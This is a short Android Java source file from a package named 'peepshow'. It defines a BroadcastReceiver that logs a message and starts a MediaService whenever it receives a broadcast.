package com.gitmad.peepshow;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class Starter extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		Log.v("Starter", "MediaService has been triggered.");
		context.startService(new Intent(context, MediaService.class));
		
	}

}
